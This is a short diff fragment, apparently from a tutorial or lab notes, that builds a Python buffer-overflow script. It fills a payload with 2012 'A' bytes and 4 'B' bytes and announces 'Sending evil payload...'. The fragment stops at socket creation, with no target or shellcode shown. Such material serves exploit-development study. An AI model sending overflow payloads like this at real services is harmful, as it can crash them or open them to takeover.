@@ -305,9 +305,17 @@ username = b"fz3r0"
 
         # "b"           ---> "b" is used before the string to send the string as Bytes and no as String
         
-message = b"A" * 2012 + b"B" *
+message = b"A" * 2012 + b"B" * 4
 
+    # The script will start the loop with "try"
+    # "Try every time to insert 2012 bytes of A's, followed by 4 bytes of B's, until crash!" 
 
+try:
+        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")
+        
+        # I'll use the socket module to create the variable "s"
+        
+        s=socket.socket
 ```
 
 
